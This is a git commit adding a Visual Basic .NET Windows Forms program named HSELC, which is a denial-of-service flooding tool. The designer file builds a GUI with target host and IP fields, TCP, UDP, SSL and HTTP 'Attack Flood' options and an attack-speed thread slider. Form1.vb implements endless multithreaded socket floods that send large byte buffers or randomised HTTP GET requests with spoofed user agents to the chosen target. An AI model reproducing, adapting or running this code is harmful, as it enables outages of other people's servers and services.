96e455424a5119abac1ce6c806733d2d3a0e3690
andrew98450 <ktpss96034@yahoo.com.tw>
2016-04-18 21:05:49 +0800

    HSELC Code

---
+++ HCELC/Form1.Designer.vb
@@ -0,0 +1,400 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form 覆寫 Dispose 以清除元件清單。
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    '為 Windows Form 設計工具的必要項
+    Private components As System.ComponentModel.IContainer
+
+    '注意:  以下為 Windows Form 設計工具所需的程序
+    '可以使用 Windows Form 設計工具進行修改。
+    '請不要使用程式碼編輯器進行修改。
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
+        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
+        Me.Button4 = New System.Windows.Forms.Button()
+        Me.Button3 = New System.Windows.Forms.Button()
+        Me.Button2 = New System.Windows.Forms.Button()
+        Me.Button1 = New System.Windows.Forms.Button()
+        Me.TextBox2 = New System.Windows.Forms.TextBox()
+        Me.TextBox1 = New System.Windows.Forms.TextBox()
+        Me.Label2 = New System.Windows.Forms.Label()
+        Me.Label1 = New System.Windows.Forms.Label()
+        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
+        Me.TextBox6 = New System.Windows.Forms.TextBox()
+        Me.Label8 = New System.Windows.Forms.Label()
+        Me.TextBox4 = New System.Windows.Forms.TextBox()
+        Me.Label5 = New System.Windows.Forms.Label()
+        Me.RadioButton3 = New System.Windows.Forms.RadioButton()
+        Me.RadioButton4 = New System.Windows.Forms.RadioButton()
+        Me.RadioButton2 = New System.Windows.Forms.RadioButton()
+        Me.RadioButton1 = New System.Windows.Forms.RadioButton()
+        Me.Label7 = New System.Windows.Forms.Label()
+        Me.Label6 = New System.Windows.Forms.Label()
+        Me.TextBox3 = New System.Windows.Forms.TextBox()
+        Me.Label4 = New System.Windows.Forms.Label()
+        Me.TrackBar1 = New System.Windows.Forms.TrackBar()
+        Me.Label3 = New System.Windows.Forms.Label()
+        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
+        Me.TextBox5 = New System.Windows.Forms.TextBox()
+        Me.GroupBox4 = New System.Windows.Forms.GroupBox()
+        Me.Label11 = New System.Windows.Forms.Label()
+        Me.GroupBox1.SuspendLayout()
+        Me.GroupBox2.SuspendLayout()
+        CType(Me.TrackBar1, System.ComponentModel.ISupportInitialize).BeginInit()
+        Me.GroupBox3.SuspendLayout()
+        Me.GroupBox4.SuspendLayout()
+        Me.SuspendLayout()
+        '
+        'GroupBox1
+        '
+        Me.GroupBox1.Controls.Add(Me.Button4)
+        Me.GroupBox1.Controls.Add(Me.Button3)
+        Me.GroupBox1.Controls.Add(Me.Button2)
+        Me.GroupBox1.Controls.Add(Me.Button1)
+        Me.GroupBox1.Controls.Add(Me.TextBox2)
+        Me.GroupBox1.Controls.Add(Me.TextBox1)
+        Me.GroupBox1.Controls.Add(Me.Label2)
+        Me.GroupBox1.Controls.Add(Me.Label1)
+        Me.GroupBox1.Location = New System.Drawing.Point(12, 12)
+        Me.GroupBox1.Name = "GroupBox1"
+        Me.GroupBox1.Size = New System.Drawing.Size(939, 101)
+        Me.GroupBox1.TabIndex = 0
+        Me.GroupBox1.TabStop = False
+        Me.GroupBox1.Text = "Target:"
+        '
+        'Button4
+        '
+        Me.Button4.Location = New System.Drawing.Point(751, 54)
+        Me.Button4.Name = "Button4"
+        Me.Button4.Size = New System.Drawing.Size(68, 30)
+        Me.Button4.TabIndex = 7
+        Me.Button4.Text = "Lock"
+        Me.Button4.UseVisualStyleBackColor = True
+        '
+        'Button3
+        '
+        Me.Button3.Location = New System.Drawing.Point(751, 21)
+        Me.Button3.Name = "Button3"
+        Me.Button3.Size = New System.Drawing.Size(68, 30)
+        Me.Button3.TabIndex = 6
+        Me.Button3.Text = "Lock"
+        Me.Button3.UseVisualStyleBackColor = True
+        '
+        'Button2
+        '
+        Me.Button2.Location = New System.Drawing.Point(837, 55)
+        Me.Button2.Name = "Button2"
+        Me.Button2.Size = New System.Drawing.Size(86, 40)
+        Me.Button2.TabIndex = 5
+        Me.Button2.Text = "Stop"
+        Me.Button2.UseVisualStyleBackColor = True
+        '
+        'Button1
+        '
+        Me.Button1.Location = New System.Drawing.Point(837, 14)
+        Me.Button1.Name = "Button1"
+        Me.Button1.Size = New System.Drawing.Size(86, 40)
+        Me.Button1.TabIndex = 4
+        Me.Button1.Text = "Start"
+        Me.Button1.UseVisualStyleBackColor = True
+        '
+        'TextBox2
+        '
+        Me.TextBox2.Location = New System.Drawing.Point(42, 60)
+        Me.TextBox2.Name = "TextBox2"
+        Me.TextBox2.Size = New System.Drawing.Size(703, 22)
+        Me.TextBox2.TabIndex = 3
+        '
+        'TextBox1
+        '
+        Me.TextBox1.Location = New System.Drawing.Point(42, 27)
+        Me.TextBox1.Name = "TextBox1"
+        Me.TextBox1.Size = New System.Drawing.Size(703, 22)
+        Me.TextBox1.TabIndex = 2
+        '
+        'Label2
+        '
+        Me.Label2.AutoSize = True
+        Me.Label2.Location = New System.Drawing.Point(9, 63)
+        Me.Label2.Name = "Label2"
+        Me.Label2.Size = New System.Drawing.Size(18, 12)
+        Me.Label2.TabIndex = 1
+        Me.Label2.Text = "IP:"
+        '
+        'Label1
+        '
+        Me.Label1.AutoSize = True
+        Me.Label1.Location = New System.Drawing.Point(7, 30)
+        Me.Label1.Name = "Label1"
+        Me.Label1.Size = New System.Drawing.Size(29, 12)
+        Me.Label1.TabIndex = 0
+        Me.Label1.Text = "Host:"
+        '
+        'GroupBox2
+        '
+        Me.GroupBox2.Controls.Add(Me.TextBox6)
+        Me.GroupBox2.Controls.Add(Me.Label8)
+        Me.GroupBox2.Controls.Add(Me.TextBox4)
+        Me.GroupBox2.Controls.Add(Me.Label5)
+        Me.GroupBox2.Controls.Add(Me.RadioButton3)
+        Me.GroupBox2.Controls.Add(Me.RadioButton4)
+        Me.GroupBox2.Controls.Add(Me.RadioButton2)
+        Me.GroupBox2.Controls.Add(Me.RadioButton1)
+        Me.GroupBox2.Controls.Add(Me.Label7)
+        Me.GroupBox2.Controls.Add(Me.Label6)
+        Me.GroupBox2.Controls.Add(Me.TextBox3)
+        Me.GroupBox2.Controls.Add(Me.Label4)
+        Me.GroupBox2.Controls.Add(Me.TrackBar1)
+        Me.GroupBox2.Controls.Add(Me.Label3)
+        Me.GroupBox2.Location = New System.Drawing.Point(12, 224)
+        Me.GroupBox2.Name = "GroupBox2"
+        Me.GroupBox2.Size = New System.Drawing.Size(939, 184)
+        Me.GroupBox2.TabIndex = 1
+        Me.GroupBox2.TabStop = False
+        Me.GroupBox2.Text = "Attack Flood options:"
+        '
+        'TextBox6
+        '
+        Me.TextBox6.Location = New System.Drawing.Point(586, 31)
+        Me.TextBox6.Name = "TextBox6"
+        Me.TextBox6.Size = New System.Drawing.Size(337, 22)
+        Me.TextBox6.TabIndex = 27
+        Me.TextBox6.Text = "9001"
+        Me.TextBox6.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
+        '
+        'Label8
+        '
+        Me.Label8.AutoSize = True
+        Me.Label8.Location = New System.Drawing.Point(533, 34)
+        Me.Label8.Name = "Label8"
+        Me.Label8.Size = New System.Drawing.Size(47, 12)
+        Me.Label8.TabIndex = 26
+        Me.Label8.Text = "Timeout:"
+        '
+        'TextBox4
+        '
+        Me.TextBox4.Location = New System.Drawing.Point(94, 31)
+        Me.TextBox4.Name = "TextBox4"
+        Me.TextBox4.Size = New System.Drawing.Size(284, 22)
+        Me.TextBox4.TabIndex = 25
+        Me.TextBox4.Text = "/"
+        Me.TextBox4.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
+        '
+        'Label5
+        '
+        Me.Label5.AutoSize = True
+        Me.Label5.Location = New System.Drawing.Point(16, 34)
+        Me.Label5.Name = "Label5"
+        Me.Label5.Size = New System.Drawing.Size(72, 12)
+        Me.Label5.TabIndex = 24
+        Me.Label5.Text = "HTTP Subsite:"
+        '
+        'RadioButton3
+        '
+        Me.RadioButton3.AutoSize = True
+        Me.RadioButton3.Location = New System.Drawing.Point(25, 101)
+        Me.RadioButton3.Name = "RadioButton3"
+        Me.RadioButton3.Size = New System.Drawing.Size(42, 16)
+        Me.RadioButton3.TabIndex = 23
+        Me.RadioButton3.TabStop = True
+        Me.RadioButton3.Text = "SSL"
+        Me.RadioButton3.UseVisualStyleBackColor = True
+        '
+        'RadioButton4
+        '
+        Me.RadioButton4.AutoSize = True
+        Me.RadioButton4.Location = New System.Drawing.Point(78, 101)
+        Me.RadioButton4.Name = "RadioButton4"
+        Me.RadioButton4.Size = New System.Drawing.Size(51, 16)
+        Me.RadioButton4.TabIndex = 22
+        Me.RadioButton4.TabStop = True
+        Me.RadioButton4.Text = "HTTP"
+        Me.RadioButton4.UseVisualStyleBackColor = True
+        '
+        'RadioButton2
+        '
+        Me.RadioButton2.AutoSize = True
+        Me.RadioButton2.Location = New System.Drawing.Point(78, 79)
+        Me.RadioButton2.Name = "RadioButton2"
+        Me.RadioButton2.Size = New System.Drawing.Size(45, 16)
+        Me.RadioButton2.TabIndex = 21
+        Me.RadioButton2.TabStop = True
+        Me.RadioButton2.Text = "UDP"
+        Me.RadioButton2.UseVisualStyleBackColor = True
+        '
+        'RadioButton1
+        '
+        Me.RadioButton1.AutoSize = True
+        Me.RadioButton1.Location = New System.Drawing.Point(25, 79)
+        Me.RadioButton1.Name = "RadioButton1"
+        Me.RadioButton1.Size = New System.Drawing.Size(44, 16)
+        Me.RadioButton1.TabIndex = 20
+        Me.RadioButton1.TabStop = True
+        Me.RadioButton1.Text = "TCP"
+        Me.RadioButton1.UseVisualStyleBackColor = True
+        '
+        'Label7
+        '
+        Me.Label7.AutoSize = True
+        Me.Label7.Font = New System.Drawing.Font("新細明體", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(136, Byte))
+        Me.Label7.Location = New System.Drawing.Point(332, 95)
+        Me.Label7.Name = "Label7"
+        Me.Label7.Size = New System.Drawing.Size(126, 13)
+        Me.Label7.TabIndex = 8
+        Me.Label7.Text = "<= Slow Theads Fast =>"
+        '
+        'Label6
+        '
+        Me.Label6.AutoSize = True
+        Me.Label6.Location = New System.Drawing.Point(144, 95)
+        Me.Label6.Name = "Label6"
+        Me.Label6.Size = New System.Drawing.Size(110, 12)
+        Me.Label6.TabIndex = 7
+        Me.Label6.Text = "Theads(Attack Speed):"
+        '
+        'TextBox3
+        '
+        Me.TextBox3.Location = New System.Drawing.Point(604, 92)
+        Me.TextBox3.Name = "TextBox3"
+        Me.TextBox3.Size = New System.Drawing.Size(319, 22)
+        Me.TextBox3.TabIndex = 4
+        Me.TextBox3.Text = "80/(SSL)443"
+        Me.TextBox3.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
+        '
+        'Label4
+        '
+        Me.Label4.AutoSize = True
+        Me.Label4.Location = New System.Drawing.Point(560, 95)
+        Me.Label4.Name = "Label4"
+        Me.Label4.Size = New System.Drawing.Size(27, 12)
+        Me.Label4.TabIndex = 3
+        Me.Label4.Text = "Port:"
+        '
+        'TrackBar1
+        '
+        Me.TrackBar1.Location = New System.Drawing.Point(4, 133)
+        Me.TrackBar1.Maximum = 20
+        Me.TrackBar1.Name = "TrackBar1"
+        Me.TrackBar1.Size = New System.Drawing.Size(929, 45)
+        Me.TrackBar1.TabIndex = 2
+        '
+        'Label3
+        '
+        Me.Label3.AutoSize = True
+        Me.Label3.Location = New System.Drawing.Point(37, 64)
+        Me.Label3.Name = "Label3"
+        Me.Label3.Size = New System.Drawing.Size(71, 12)
+        Me.Label3.TabIndex = 1
+        Me.Label3.Text = "     Method     "
+        '
+        'GroupBox3
+        '
+        Me.GroupBox3.Controls.Add(Me.TextBox5)
+        Me.GroupBox3.Location = New System.Drawing.Point(12, 119)
+        Me.GroupBox3.Name = "GroupBox3"
+        Me.GroupBox3.Size = New System.Drawing.Size(939, 99)
+        Me.GroupBox3.TabIndex = 2
+        Me.GroupBox3.TabStop = False
+        Me.GroupBox3.Text = "IP View:"
+        '
+        'TextBox5
+        '
+        Me.TextBox5.BackColor = System.Drawing.Color.WhiteSmoke
+        Me.TextBox5.Font = New System.Drawing.Font("新細明體", 48.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(136, Byte))
+        Me.TextBox5.ForeColor = System.Drawing.SystemColors.WindowText
+        Me.TextBox5.Location = New System.Drawing.Point(6, 19)
+        Me.TextBox5.Multiline = True
+        Me.TextBox5.Name = "TextBox5"
+        Me.TextBox5.Size = New System.Drawing.Size(927, 74)
+        Me.TextBox5.TabIndex = 0
+        Me.TextBox5.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
+        '
+        'GroupBox4
+        '
+        Me.GroupBox4.Controls.Add(Me.Label11)
+        Me.GroupBox4.Location = New System.Drawing.Point(12, 414)
+        Me.GroupBox4.Name = "GroupBox4"
+        Me.GroupBox4.Size = New System.Drawing.Size(939, 82)
+        Me.GroupBox4.TabIndex = 3
+        Me.GroupBox4.TabStop = False
+        Me.GroupBox4.Text = "Dos Status:"
+        '
+        'Label11
+        '
+        Me.Label11.BackColor = System.Drawing.Color.DarkRed
+        Me.Label11.Font = New System.Drawing.Font("新細明體", 15.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(136, Byte))
+        Me.Label11.ForeColor = System.Drawing.SystemColors.ControlLightLight
+        Me.Label11.Location = New System.Drawing.Point(4, 27)
+        Me.Label11.Name = "Label11"
+        Me.Label11.Size = New System.Drawing.Size(929, 41)
+        Me.Label11.TabIndex = 3
+        Me.Label11.Text = "None Request..."
+        Me.Label11.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 12.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(963, 507)
+        Me.Controls.Add(Me.GroupBox4)
+        Me.Controls.Add(Me.GroupBox3)
+        Me.Controls.Add(Me.GroupBox2)
+        Me.Controls.Add(Me.GroupBox1)
+        Me.ForeColor = System.Drawing.Color.Black
+        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
+        Me.Name = "Form1"
+        Me.Text = "HSELC"
+        Me.GroupBox1.ResumeLayout(False)
+        Me.GroupBox1.PerformLayout()
+        Me.GroupBox2.ResumeLayout(False)
+        Me.GroupBox2.PerformLayout()
+        CType(Me.TrackBar1, System.ComponentModel.ISupportInitialize).EndInit()
+        Me.GroupBox3.ResumeLayout(False)
+        Me.GroupBox3.PerformLayout()
+        Me.GroupBox4.ResumeLayout(False)
+        Me.ResumeLayout(False)
+
+    End Sub
+    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
+    Friend WithEvents Button2 As System.Windows.Forms.Button
+    Friend WithEvents Button1 As System.Windows.Forms.Button
+    Friend WithEvents TextBox2 As System.Windows.Forms.TextBox
+    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
+    Friend WithEvents Label2 As System.Windows.Forms.Label
+    Friend WithEvents Label1 As System.Windows.Forms.Label
+    Friend WithEvents GroupBox2 As System.Windows.Forms.GroupBox
+    Friend WithEvents TextBox3 As System.Windows.Forms.TextBox
+    Friend WithEvents Label4 As System.Windows.Forms.Label
+    Friend WithEvents TrackBar1 As System.Windows.Forms.TrackBar
+    Friend WithEvents Label3 As System.Windows.Forms.Label
+    Friend WithEvents GroupBox3 As System.Windows.Forms.GroupBox
+    Friend WithEvents TextBox5 As System.Windows.Forms.TextBox
+    Friend WithEvents Label7 As System.Windows.Forms.Label
+    Friend WithEvents Label6 As System.Windows.Forms.Label
+    Friend WithEvents GroupBox4 As System.Windows.Forms.GroupBox
+    Friend WithEvents Label11 As System.Windows.Forms.Label
+    Friend WithEvents Button3 As System.Windows.Forms.Button
+    Friend WithEvents Button4 As System.Windows.Forms.Button
+    Friend WithEvents RadioButton3 As System.Windows.Forms.RadioButton
+    Friend WithEvents RadioButton4 As System.Windows.Forms.RadioButton
+    Friend WithEvents RadioButton2 As System.Windows.Forms.RadioButton
+    Friend WithEvents RadioButton1 As System.Windows.Forms.RadioButton
+    Friend WithEvents Label5 As System.Windows.Forms.Label
+    Friend WithEvents TextBox4 As System.Windows.Forms.TextBox
+    Friend WithEvents TextBox6 As System.Windows.Forms.TextBox
+    Friend WithEvents Label8 As System.Windows.Forms.Label
+
+End Class
---
+++ HCELC/Form1.vb
@@ -0,0 +1,136 @@
+﻿Imports System.Net
+Imports System.Net.Sockets
+Imports System.Text
+Public Class Form1
+    Dim List As New List(Of Threading.Thread) '將執行緒加入排列
+    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
+        Try '用Try判斷
+            TextBox5.Text = Dns.GetHostEntry(TextBox1.Text).AddressList(0).ToString '如果主機存在TextBox5會顯示IP
+        Catch ex As Exception '如果發生例外
+            TextBox5.Text = "NONE" '如果主機不存在TextBox5會顯示NONE
+        End Try '結束Try區塊
+    End Sub
+
+    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
+        TextBox5.Text = TextBox2.Text 'IP直接顯示到TextBox5
+    End Sub
+    Function RandomString() As String '建立String函數
+        Dim builder As New StringBuilder() '宣告為可變動字串
+        Dim random As New Random() '宣告為亂數
+        Dim ch As Char '宣告為字元
+        For i = 0 To 6 '執行6次
+            ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65))) '加入指派至ch
+            builder.Append(ch) '不解釋
+        Next
+        Return builder.ToString() '傳回builder.ToString()物件
+    End Function
+    Function RandomUserAgent() As String '建立String函數
+        Dim random As New Random '宣告為亂數
+        Dim osversions As String() = {"5.1", "6.0", "6.1"} '宣告字串陣列
+        Dim oslanguages As String() = {"en-GB", "en-US", "es-ES", "pt-BR", "pt-PT", "sv-SE"} '宣告字串陣列
+        Dim version As String = osversions(random.Next(0, osversions.Length - 1))  '不解釋
+        Dim language As String = oslanguages(random.Next(0, oslanguages.Length - 1))  '不解釋
+        Dim useragent As String = String.Format("Mozilla/5.0 (Windows; U; Windows NT {0}; {1}; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17", version, language)  '不解釋
+        Return useragent '傳回useragent物件
+    End Function
+    Public Sub TCP() 'TCP 方法(副程式Sub)
+        Try
+            Do While True
+                Dim socket As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
+                Dim ip As New IPEndPoint(IPAddress.Parse(TextBox5.Text), TextBox3.Text)
+                Dim bytes As Byte() = New Byte(10000) {}
+                socket.Connect(ip)
+                socket.SendTimeout = Integer.Parse(TextBox6.Text)
+                socket.Send(bytes)
+            Loop
+        Catch ex As Exception
+        End Try
+    End Sub
+    Public Sub UDP() 'UDP 方法(副程式Sub)
+        Try
+            Do While True
+                Dim Socket As New Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
+                Dim IP As New IPEndPoint(IPAddress.Parse(TextBox5.Text), port:=TextBox3.Text)
+                Dim Bytes As Byte() = New Byte(10000) {}
+                Socket.Connect(IP)
+                Socket.SendTimeout = Integer.Parse(TextBox6.Text)
+                Socket.Send(Bytes, SocketFlags.None)
+            Loop
+        Catch ex As Exception
+        End Try
+    End Sub
+    Dim rsa As System.Security.Cryptography.RSA
+    Public Sub SSL() 'SSL 方法(副程式Sub)
+        Try
+            Do While True
+                Dim rsa As New System.Security.Cryptography.RSACryptoServiceProvider(1024)
+                Dim socket As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
+                Dim g() As Byte = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{5}Host: {3}{5}User-Agent: {2}{5}Accept: */*{5}{4}{5}{5}", TextBox4.Text, (RandomString()), RandomUserAgent(), "192.168.1.1", ("Accept-Encoding: gzip, deflate")))
+                Dim bytes As Byte() = rsa.EncryptValue(g)
+                Dim ip As New IPEndPoint(IPAddress.Parse(TextBox5.Text), TextBox3.Text)
+                socket.Connect(ip)
+                socket.SendTimeout = Integer.Parse(TextBox6.Text)
+                socket.Send(bytes, SocketFlags.None)
+            Loop
+        Catch ex As Exception
+        End Try
+    End Sub
+    Public Sub HTTP() 'HTTP 方法(副程式Sub)
+        Try
+            Do While True
+                Dim socket As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
+                Dim bytes() As Byte = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{5}Host: {3}{5}User-Agent: {2}{5}Accept: */*{5}{4}{5}{5}", TextBox4.Text, (RandomString()), RandomUserAgent(), "127.0.0.1", ("Accept-Encoding: gzip, deflate" + Environment.NewLine), Environment.NewLine))
+                Dim ip As New IPEndPoint(IPAddress.Parse(TextBox5.Text), TextBox3.Text)
+                socket.Connect(ip)
+                socket.SendTimeout = Integer.Parse(TextBox6.Text)
+                Socket.Send(bytes, SocketFlags.None)
+            Loop
+        Catch ex As Exception
+        End Try
+    End Sub
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        List.Clear()
+        Label11.Text = "Send Request..."
+        Label11.BackColor = Color.ForestGreen
+        If RadioButton1.Checked = True Then '如果選擇RadioButton1
+            For i = 0 To TrackBar1.Value - 1
+                Dim TCPFlood As New Threading.Thread(AddressOf TCP) '將TCP方法(副程式Sub)加入執行緒
+                TCPFlood.IsBackground = True '設定為背景執行緒
+                TCPFlood.Start()
+                List.Add(TCPFlood) '將TCP方法(副程式Sub)加入排列
+            Next
+        ElseIf RadioButton2.Checked = True Then '(假如True不成立)選擇RadioButton2
+            For i = 0 To TrackBar1.Value - 1
+                Dim UDPFlood As New Threading.Thread(AddressOf UDP) '將UDP方法(副程式Sub)加入執行緒
+                UDPFlood.IsBackground = True '設定為背景執行緒
+                UDPFlood.Start()
+                List.Add(UDPFlood) '將UDP方法(副程式Sub)加入排列
+            Next
+        ElseIf RadioButton3.Checked = True Then '(假如True不成立)選擇RadioButton3
+            For i = 0 To TrackBar1.Value - 1
+                Dim SSLFlood As New Threading.Thread(AddressOf SSL) '將SSL方法(副程式Sub)加入執行緒
+                SSLFlood.IsBackground = True '設定為背景執行緒
+                SSLFlood.Start()
+                List.Add(SSLFlood) '將SSL方法(副程式Sub)加入排列
+            Next
+        ElseIf RadioButton4.Checked = True Then '(假如True不成立)選擇RadioButton4
+            For i = 0 To TrackBar1.Value - 1
+                Dim HTTPFlood As New Threading.Thread(AddressOf HTTP) '將HTTP方法(副程式Sub)加入執行緒
+                HTTPFlood.IsBackground = True '設定為背景執行緒
+                HTTPFlood.Start()
+                List.Add(HTTPFlood) '將HTTP方法(副程式Sub)加入排列
+            Next
+        End If
+    End Sub
+    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
+        For i = 0 To List.Count - 1 '用For迴圈找執行緒
+            List(i).Abort() '如果找到將引發ThreadAbortException例外來結束執行緒
+        Next '結束For迴圈
+        Label11.Text = "None Request..."
+        Label11.BackColor = Color.DarkRed
+    End Sub
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load '不解釋
+        MsgBox("Wecome to HSELC")
+        TextBox5.Enabled = False
+    End Sub
+End Class
